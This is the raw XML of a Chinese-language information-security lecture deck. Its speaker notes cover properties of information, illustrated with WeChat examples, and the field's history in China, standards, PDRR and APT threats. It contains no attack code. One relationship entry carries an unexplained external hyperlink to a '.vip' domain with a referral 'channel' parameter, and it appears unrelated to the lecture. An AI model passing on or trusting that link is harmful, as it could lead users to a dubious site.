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14.jpg" ContentType="image/png"/>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media/image21.jpg" ContentType="image/gif"/>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media/image55.jpg" ContentType="image/png"/>
  <Override PartName="/ppt/media/image87.jpg" ContentType="image/png"/>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7"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="704" r:id="rId2"/>
    <p:sldId id="586" r:id="rId3"/>
    <p:sldId id="705" r:id="rId4"/>
    <p:sldId id="971" r:id="rId5"/>
    <p:sldId id="874" r:id="rId6"/>
    <p:sldId id="706" r:id="rId7"/>
    <p:sldId id="812" r:id="rId8"/>
    <p:sldId id="813" r:id="rId9"/>
    <p:sldId id="868" r:id="rId10"/>
    <p:sldId id="814" r:id="rId11"/>
    <p:sldId id="707" r:id="rId12"/>
    <p:sldId id="708" r:id="rId13"/>
    <p:sldId id="716" r:id="rId14"/>
    <p:sldId id="717" r:id="rId15"/>
    <p:sldId id="718" r:id="rId16"/>
    <p:sldId id="719" r:id="rId17"/>
    <p:sldId id="720" r:id="rId18"/>
    <p:sldId id="721" r:id="rId19"/>
    <p:sldId id="818" r:id="rId20"/>
    <p:sldId id="722" r:id="rId21"/>
    <p:sldId id="723" r:id="rId22"/>
    <p:sldId id="817" r:id="rId23"/>
    <p:sldId id="724" r:id="rId24"/>
    <p:sldId id="821" r:id="rId25"/>
    <p:sldId id="824" r:id="rId26"/>
    <p:sldId id="727" r:id="rId27"/>
    <p:sldId id="728" r:id="rId28"/>
    <p:sldId id="729" r:id="rId29"/>
    <p:sldId id="825" r:id="rId30"/>
    <p:sldId id="731" r:id="rId31"/>
    <p:sldId id="732" r:id="rId32"/>
    <p:sldId id="733" r:id="rId33"/>
    <p:sldId id="827" r:id="rId34"/>
    <p:sldId id="828" r:id="rId35"/>
    <p:sldId id="830" r:id="rId36"/>
    <p:sldId id="829" r:id="rId37"/>
    <p:sldId id="831" r:id="rId38"/>
    <p:sldId id="735" r:id="rId39"/>
    <p:sldId id="736" r:id="rId40"/>
    <p:sldId id="737" r:id="rId41"/>
    <p:sldId id="738" r:id="rId42"/>
    <p:sldId id="739" r:id="rId43"/>
    <p:sldId id="815" r:id="rId44"/>
    <p:sldId id="740" r:id="rId45"/>
    <p:sldId id="741" r:id="rId46"/>
    <p:sldId id="742" r:id="rId47"/>
    <p:sldId id="743" r:id="rId48"/>
    <p:sldId id="744" r:id="rId49"/>
    <p:sldId id="745" r:id="rId50"/>
    <p:sldId id="746" r:id="rId51"/>
    <p:sldId id="747" r:id="rId52"/>
    <p:sldId id="748" r:id="rId53"/>
    <p:sldId id="749" r:id="rId54"/>
    <p:sldId id="750" r:id="rId55"/>
    <p:sldId id="835" r:id="rId56"/>
    <p:sldId id="836" r:id="rId57"/>
    <p:sldId id="751" r:id="rId58"/>
    <p:sldId id="861" r:id="rId59"/>
    <p:sldId id="752" r:id="rId60"/>
    <p:sldId id="837" r:id="rId61"/>
    <p:sldId id="753" r:id="rId62"/>
    <p:sldId id="833" r:id="rId63"/>
    <p:sldId id="754" r:id="rId64"/>
    <p:sldId id="838" r:id="rId65"/>
    <p:sldId id="839" r:id="rId66"/>
    <p:sldId id="756" r:id="rId67"/>
    <p:sldId id="840" r:id="rId68"/>
    <p:sldId id="758" r:id="rId69"/>
    <p:sldId id="759" r:id="rId70"/>
    <p:sldId id="841" r:id="rId71"/>
    <p:sldId id="761" r:id="rId72"/>
    <p:sldId id="762" r:id="rId73"/>
    <p:sldId id="763" r:id="rId74"/>
    <p:sldId id="842" r:id="rId75"/>
    <p:sldId id="764" r:id="rId76"/>
    <p:sldId id="843" r:id="rId77"/>
    <p:sldId id="766" r:id="rId78"/>
    <p:sldId id="844" r:id="rId79"/>
    <p:sldId id="767" r:id="rId80"/>
    <p:sldId id="845" r:id="rId81"/>
    <p:sldId id="768" r:id="rId82"/>
    <p:sldId id="870" r:id="rId83"/>
    <p:sldId id="769" r:id="rId84"/>
    <p:sldId id="770" r:id="rId85"/>
    <p:sldId id="771" r:id="rId86"/>
    <p:sldId id="772" r:id="rId87"/>
    <p:sldId id="773" r:id="rId88"/>
    <p:sldId id="774" r:id="rId89"/>
    <p:sldId id="775" r:id="rId90"/>
    <p:sldId id="776" r:id="rId91"/>
    <p:sldId id="846" r:id="rId92"/>
    <p:sldId id="853" r:id="rId93"/>
    <p:sldId id="855" r:id="rId94"/>
    <p:sldId id="856" r:id="rId95"/>
    <p:sldId id="848" r:id="rId96"/>
    <p:sldId id="849" r:id="rId97"/>
    <p:sldId id="850" r:id="rId98"/>
    <p:sldId id="851" r:id="rId99"/>
    <p:sldId id="852" r:id="rId100"/>
    <p:sldId id="857" r:id="rId101"/>
    <p:sldId id="871" r:id="rId102"/>
    <p:sldId id="779" r:id="rId103"/>
    <p:sldId id="780" r:id="rId104"/>
    <p:sldId id="781" r:id="rId105"/>
    <p:sldId id="782" r:id="rId106"/>
    <p:sldId id="783" r:id="rId107"/>
    <p:sldId id="859" r:id="rId108"/>
    <p:sldId id="860" r:id="rId109"/>
    <p:sldId id="872" r:id="rId110"/>
    <p:sldId id="784" r:id="rId111"/>
    <p:sldId id="785" r:id="rId112"/>
    <p:sldId id="787" r:id="rId113"/>
    <p:sldId id="788" r:id="rId114"/>
    <p:sldId id="789" r:id="rId115"/>
    <p:sldId id="790" r:id="rId116"/>
    <p:sldId id="791" r:id="rId117"/>
    <p:sldId id="792" r:id="rId118"/>
    <p:sldId id="862" r:id="rId119"/>
    <p:sldId id="793" r:id="rId120"/>
    <p:sldId id="794" r:id="rId121"/>
    <p:sldId id="795" r:id="rId122"/>
    <p:sldId id="796" r:id="rId123"/>
    <p:sldId id="863" r:id="rId124"/>
    <p:sldId id="797" r:id="rId125"/>
    <p:sldId id="798" r:id="rId126"/>
    <p:sldId id="866" r:id="rId127"/>
    <p:sldId id="799" r:id="rId128"/>
    <p:sldId id="867" r:id="rId129"/>
    <p:sldId id="800" r:id="rId130"/>
    <p:sldId id="801" r:id="rId131"/>
    <p:sldId id="808" r:id="rId132"/>
    <p:sldId id="875" r:id="rId133"/>
    <p:sldId id="877" r:id="rId134"/>
    <p:sldId id="878" r:id="rId135"/>
    <p:sldId id="879" r:id="rId136"/>
    <p:sldId id="880" r:id="rId137"/>
    <p:sldId id="881" r:id="rId138"/>
    <p:sldId id="882" r:id="rId139"/>
    <p:sldId id="883" r:id="rId140"/>
    <p:sldId id="884" r:id="rId141"/>
    <p:sldId id="885" r:id="rId142"/>
    <p:sldId id="886" r:id="rId143"/>
    <p:sldId id="887" r:id="rId144"/>
    <p:sldId id="888" r:id="rId145"/>
    <p:sldId id="889" r:id="rId146"/>
    <p:sldId id="890" r:id="rId147"/>
    <p:sldId id="891" r:id="rId148"/>
    <p:sldId id="892" r:id="rId149"/>
    <p:sldId id="893" r:id="rId150"/>
    <p:sldId id="894" r:id="rId151"/>
    <p:sldId id="895" r:id="rId152"/>
    <p:sldId id="896" r:id="rId153"/>
    <p:sldId id="897" r:id="rId154"/>
    <p:sldId id="898" r:id="rId155"/>
    <p:sldId id="899" r:id="rId156"/>
    <p:sldId id="900" r:id="rId157"/>
    <p:sldId id="901" r:id="rId158"/>
    <p:sldId id="902" r:id="rId159"/>
    <p:sldId id="876" r:id="rId160"/>
    <p:sldId id="903" r:id="rId161"/>
    <p:sldId id="904" r:id="rId162"/>
    <p:sldId id="905" r:id="rId163"/>
    <p:sldId id="906" r:id="rId164"/>
    <p:sldId id="907" r:id="rId165"/>
    <p:sldId id="908" r:id="rId166"/>
    <p:sldId id="909" r:id="rId167"/>
    <p:sldId id="910" r:id="rId168"/>
    <p:sldId id="911" r:id="rId169"/>
    <p:sldId id="912" r:id="rId170"/>
    <p:sldId id="913" r:id="rId171"/>
    <p:sldId id="914" r:id="rId172"/>
    <p:sldId id="915" r:id="rId173"/>
    <p:sldId id="1101" r:id="rId174"/>
    <p:sldId id="1351" r:id="rId175"/>
    <p:sldId id="1103" r:id="rId176"/>
    <p:sldId id="1104" r:id="rId177"/>
    <p:sldId id="1105" r:id="rId178"/>
    <p:sldId id="916" r:id="rId179"/>
    <p:sldId id="917" r:id="rId180"/>
    <p:sldId id="918" r:id="rId181"/>
    <p:sldId id="919" r:id="rId182"/>
    <p:sldId id="921" r:id="rId183"/>
    <p:sldId id="922" r:id="rId184"/>
    <p:sldId id="923" r:id="rId185"/>
    <p:sldId id="924" r:id="rId186"/>
    <p:sldId id="926" r:id="rId187"/>
    <p:sldId id="927" r:id="rId188"/>
    <p:sldId id="929" r:id="rId189"/>
    <p:sldId id="930" r:id="rId190"/>
    <p:sldId id="931" r:id="rId191"/>
    <p:sldId id="932" r:id="rId192"/>
    <p:sldId id="933" r:id="rId193"/>
    <p:sldId id="934" r:id="rId194"/>
    <p:sldId id="936" r:id="rId195"/>
    <p:sldId id="937" r:id="rId196"/>
    <p:sldId id="939" r:id="rId197"/>
    <p:sldId id="940" r:id="rId198"/>
    <p:sldId id="941" r:id="rId199"/>
    <p:sldId id="942" r:id="rId200"/>
    <p:sldId id="943" r:id="rId201"/>
    <p:sldId id="944" r:id="rId202"/>
    <p:sldId id="945" r:id="rId203"/>
    <p:sldId id="946" r:id="rId204"/>
    <p:sldId id="947" r:id="rId205"/>
    <p:sldId id="948" r:id="rId206"/>
    <p:sldId id="949" r:id="rId207"/>
    <p:sldId id="950" r:id="rId208"/>
    <p:sldId id="952" r:id="rId209"/>
    <p:sldId id="954" r:id="rId210"/>
    <p:sldId id="956" r:id="rId211"/>
    <p:sldId id="957" r:id="rId212"/>
    <p:sldId id="958" r:id="rId213"/>
    <p:sldId id="959" r:id="rId214"/>
    <p:sldId id="960" r:id="rId215"/>
    <p:sldId id="961" r:id="rId216"/>
    <p:sldId id="962" r:id="rId217"/>
    <p:sldId id="963" r:id="rId218"/>
    <p:sldId id="964" r:id="rId219"/>
    <p:sldId id="965" r:id="rId220"/>
    <p:sldId id="966" r:id="rId221"/>
    <p:sldId id="967" r:id="rId222"/>
    <p:sldId id="968" r:id="rId223"/>
    <p:sldId id="969" r:id="rId224"/>
    <p:sldId id="970" r:id="rId225"/>
    <p:sldId id="869" r:id="rId226"/>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66FF"/>
    <a:srgbClr val="CCECFF"/>
    <a:srgbClr val="6666FF"/>
    <a:srgbClr val="FF9900"/>
    <a:srgbClr val="008000"/>
    <a:srgbClr val="5F5F5F"/>
    <a:srgbClr val="FFCC00"/>
    <a:srgbClr val="3399FF"/>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32" autoAdjust="0"/>
    <p:restoredTop sz="67905" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="134" d="100"/>
          <a:sy n="134" d="100"/>
        </p:scale>
        <p:origin x="2516" y="84"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2160"/>
        <p:guide pos="2880"/>
      </p:guideLst>
    </p:cSldViewPr>
  </p:slideViewPr>
  <p:outlineViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="33" d="100"/>
        <a:sy n="33" d="100"/>
      </p:scale>
      <p:origin x="18" y="66168"/>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viewProps" Target="viewProp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231" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyle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mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159747"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mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10240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159749"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9750"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mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159751"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mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{B487D939-5749-4C63-8AED-0305FE88E523}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18502108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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.444332.vip/?channel=P00142\" TargetMode="External"/><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2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2064380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3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2199992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4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="855099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5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2187119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依附性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>“明天</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>点开会”这条信息，必须依附在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>文字、语音、图片</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>等载体上，发到微信里别人才能看到。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>动态性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>班群里原来说“周三交作业”，后来老师又改成“周五交”，说明信息会随着情况变化而变化。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>可处理性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>你把老师发来的长消息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>复制、截图、收藏、搜索关键词</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，这就是对信息进行处理。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>共享性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>一份课件发到班级微信群后，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>所有群成员都能查看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，说明信息可以被多人共享。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>可传递性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>你把辅导员发给你的通知</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>转发到宿舍群</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，信息就从一个人传到了更多人。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>异步性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>你晚上</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>点发微信给同学，对方第二天早上再回复，说明微信通信</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>不要求双方同时在线</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>可交换性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>你发“明天几点上课？”，同学回“上午</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>点”，双方一问一答，完成了信息交换。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>可伪性：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>比如微信群里有人发“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>鸟巢大会，每人领</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>万</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”这类假消息，或者伪造转账截图，说明信息可能被伪造。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2601553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9BD5F53-342E-41C2-8D03-B4DA4582DB1E}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108547" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1258888" y="720725"/>
            <a:ext cx="4800600" cy="3600450"/>
          </a:xfrm>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itchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="462945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98</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，启明星辰 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>IPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2000</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，网络泡沫，风口</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2000-2003</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，国家提出信息安全保障</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>至今，网络空间安全，变化大：云计算，按区域配置</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14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="786429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密码学</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15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="822153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自动化</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16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1921381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我们的标准基本等同采用美国的，</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ISO-7498-2</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t> 我们的安全体系结构，</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17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1362391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95</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年严峻形势，国家领导境外寻访计划被泄露</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18</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="581310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03</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，国家提出。</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>用户想少花钱，等级尽量低；商家相反</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全意识并不是每个人都有，没经历过就能以体会，安全普及任重道远</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19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1638704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2000</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，申请教育部“信安”专业，专业太小，没准</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>02</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>年，“信安”专业申请通过，开办，川大是最早的信安专业学校之一</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21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2843299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对于安全，除了技术，人也很重要，落地的制度挺重要的</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>PDRR</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，对比通信体系，安全可靠得多</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22</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1058135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主动防御、被动防御，我们一般都是被动防御，出问题才扫描诊断</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>美国长期</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>APT</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击</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23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2327157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25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
